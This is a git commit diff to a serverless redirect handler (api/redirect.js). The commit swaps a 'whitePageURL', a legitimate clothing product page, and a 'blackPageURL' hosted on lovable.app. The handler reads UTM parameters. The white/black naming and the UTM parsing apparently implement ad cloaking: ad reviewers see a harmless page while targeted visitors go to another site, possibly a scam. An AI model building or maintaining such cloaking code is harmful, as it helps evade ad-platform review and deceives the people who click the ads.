5a822695d3c11d6793ee3cb52707b3d0dd633b6a
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-29 22:52:53 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://bebesweeny.com/collections/shop-new-in-latest-baby-kidswear/products/tamar-girls-pink-velour-rosa-print-2-piece-loungewear-set";
-    const blackPageURL = "https://casssshlov.lovable.app";
+    const whitePageURL = "https://www.hellosimone.fr/products/myrtille-blouse-pink-check";
+    const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
